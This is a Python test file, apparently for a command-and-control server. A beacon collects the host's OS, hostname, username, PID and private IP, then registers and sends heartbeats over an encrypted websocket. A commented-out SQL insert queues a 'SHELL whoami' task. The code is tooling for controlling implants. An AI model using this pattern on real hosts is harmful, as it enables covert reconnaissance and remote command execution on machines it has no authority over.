# importing project py modules 
from app import interface, database
from app.core import models
import asyncio
import aiosqlite
from app.core import encoding
from app.core.settings import Config

# importing pythin lib
import json
import os # this is the library the beacon will use to find the hardware/ip data
import socket # netowrking library to find ip
import time
from datetime import UTC, datetime
from fastapi import FastAPI
from fastapi.testclient import TestClient
from fastapi import WebSocket

app = FastAPI()

client = TestClient(app)


def get_priv_ip() -> str:
        host = socket.gethostname()
        private_ip = socket.gethostbyname(host)

        return str(private_ip)

@app.websocket("/ws")
async def endpoint(websocket: WebSocket):
    await websocket.accept()

    async with aiosqlite.connect(Config.database_file_path) as db:
        await db.executescript(database.SCHEMA)
        await db.commit()

        await interface.recieve_data(websocket, db)
                
        """await db.execute("
                                INSERT INTO tasks(task_id, command, args, created_at) 
                                VALUES (?, "SHELL", "whoami", ?)
                                ", (id, datetime.now(UTC).isoformat()))
                            """
        
        await websocket.close()


def test_registry():

    # get host data
    operating = os.uname()
    host_pid = int(os.getpid())
    host_username = str(os.getlogin())
    private_ip = get_priv_ip()

    with client.websocket_connect("/ws") as websocket:
        register_message = encoding.encode(json.dumps({'type': 'REGISTER', 
                                                                          'payload':{'os':str(operating.sysname), 
                                                                                      'hostname':str(operating.nodename), 
                                                                                      'username': host_username, 
                                                                                      'pid': host_pid, 
                                                                                      'internal_ip': private_ip}
                                                                                      }), Config.encryption_key)

        websocket.send_text(register_message)

        id = websocket.receive_text()
        print(f"test_interface: {str(id)}")

        heartbeat_message = encoding.encode(json.dumps({'type': 'HEARTBEAT', 
                                                        'payload': {'agent_id' : str(id), 
                                                                    'first_seen': '',
                                                                    'last_seen': ''}}), Config.encryption_key)
            
        websocket.send_text(heartbeat_message)
        tasks = websocket.receive_text()

        print(tasks)
        websocket.close()
        
                               
          
        

if __name__ == '__main__':
    test_registry()